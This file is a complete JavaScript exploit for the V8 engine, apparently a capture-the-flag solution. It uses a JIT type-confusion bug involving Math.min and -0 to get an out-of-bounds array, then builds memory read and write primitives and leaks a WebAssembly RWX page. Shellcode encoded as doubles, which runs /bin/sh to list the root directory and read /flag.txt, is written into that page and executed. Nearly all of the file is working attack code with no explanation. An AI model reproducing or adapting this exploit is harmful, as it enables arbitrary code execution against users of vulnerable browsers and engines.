var buf = new ArrayBuffer(8);
var f64 = new Float64Array(buf);
var i64 = new BigInt64Array(buf);

function f2i(v) {
        f64[0] = v;
        return i64[0];
}
function i2f(v) {
        i64[0] = v;
        return f64[0];
}
function hex(v) { return "0x"+v.toString(16); }

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var shellcode = wasm_instance.exports.main;

function optme(){
        var str = "ABC";
        var bad = str.indexOf("a");
        bad = Math.min(bad, -0);
        bad = -bad;
        bad *= 0x100;
        bad += 10;
        var out = Array(bad);
        out[0] = 1.1;
        return [out, {}];
}

var oob = optme()[0];
for (let i = 0; i < 100000; i++) {
        oob = optme();
}

// get oob array
oob = optme()[0];

// prepare helpers
var reader = [1.1, 2.2, 3.3];
var objarray = [reader, wasm_instance];
var writer = new ArrayBuffer(8);
var f64_writer = new Float64Array(writer);

// addr of wasm_instance
leak = f2i(oob[35]) >> 32n;

// elem of "reader" points to wasm_instance+0x60 (have rwx addr)
oob[23] =  i2f((6n << 32n)+leak+0x60n);

// leak rwx address 
var rwx = f2i(reader[0]);
print("rwx: ", hex(rwx));

// length of "writer" 
oob[47] = i2f(0x20n);

// backing store ptr of "writer"  
oob[48] = i2f(rwx);

// cmd: /bin/sh -c "ls -la /; cat /flag.txt"
var sc = [-6.828527034422786e-229, 3.1048139649706616e-307, 1.9806662284999126e+161, 2.432065721434653e-152, 1.7058643057456533e+272, 5.73e-322, 0.0, 0.0, 0.0, 0.0, 0.0, 5.432309224871097e-309, 1.238567325343229e-308, 6.867659397698158e+246, -3.985959746423108e-73, -7.161105510817759e-74, 1.638223e-318];

// set shellcode to rwx
f64_writer.set(sc, 0);

shellcode();

// END
